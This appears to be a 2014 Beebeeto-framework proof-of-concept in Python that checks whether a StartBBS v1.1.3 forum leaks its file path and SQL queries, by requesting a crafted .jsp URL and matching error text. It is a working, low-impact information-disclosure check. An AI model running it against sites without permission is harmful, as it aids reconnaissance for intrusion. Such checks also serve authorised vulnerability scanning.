#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0191',
            'name': 'StartBBS v1.1.3 物理路径泄漏 POC',
            'author': '小马甲',
            'create_date': '2014-12-09',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'StartBBS',
            'vul_version': ['1.1.3'],
            'type': 'Information Disclosure',
            'tag': ['StartBBS信息泄露', 'StartBBS爆路径', 'php'],
            'desc': 'http://startbbs/index.php/home/getmore/w.jsp 随意构造一个.jsp爆出数据库查询语句',
            'references': ['http://www.wooyun.org/bugs/wooyun-2013-045780',
                           ],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + '/index.php/home/getmore/w.jsp'
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if 'Filename:' in content and 'You have an error in your SQL syntax' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())